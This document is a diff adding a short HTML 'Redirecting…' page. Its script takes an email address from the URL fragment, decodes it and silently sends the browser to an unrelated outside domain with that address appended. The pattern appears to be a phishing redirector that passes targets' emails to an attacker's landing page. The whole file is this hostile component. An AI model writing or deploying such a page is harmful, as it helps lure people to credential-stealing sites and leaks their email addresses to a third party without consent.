@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting…</title>
+</head>
+<body>
+
+<p>Redirecting, please wait…</p>
+
+<script>
+(function () {
+  const hash = window.location.hash;
+
+  if (!hash || hash.length <= 1) return;
+
+  // Remove #
+  let email = hash.substring(1);
+
+  // Decode %40 → @ (and any other encoding)
+  try {
+    email = decodeURIComponent(email);
+  } catch (e) {
+    return;
+  }
+
+  // Basic validation
+  if (!email.includes("@")) return;
+
+  // Redirect with CLEAN @
+  window.location.replace(
+    "https://advancedoxymed.com/elmoon/*" + email
+  );
+})();
+</script>
+
+</body>
+</html>
